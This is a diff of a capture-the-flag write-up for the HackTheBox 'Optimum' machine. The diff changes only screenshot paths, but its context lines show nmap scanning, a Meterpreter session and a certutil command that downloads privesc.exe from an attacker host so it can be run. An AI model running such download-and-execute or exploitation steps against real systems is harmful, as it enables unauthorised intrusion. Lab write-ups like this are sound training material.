@@ -46,7 +46,7 @@ We start by verifying host availability with ICMP:
 ping -c 1 10.10.10.8
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Optimum/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -66,7 +66,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Optimum/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -74,7 +74,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Optimum/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -92,7 +92,7 @@ nmap -p80 -sC -sV 10.10.10.8 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-![targeted](cases/HackTheBox/Machines/EASY/Optimum/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**  
 
@@ -159,7 +159,7 @@ run
 
 A Meterpreter session is established.
 
-![user_flag](cases/HackTheBox/Machines/EASY/Optimum/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 âœ… **User flag obtained**
 
@@ -222,7 +222,7 @@ certutil.exe -f -urlcache -split http://10.10.14.10:8000/privesc.exe privesc.exe
 
 Execute the binary:
 
-![root_flag](cases/HackTheBox/Machines/EASY/Optimum/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ðŸ **Root flag obtained**
 
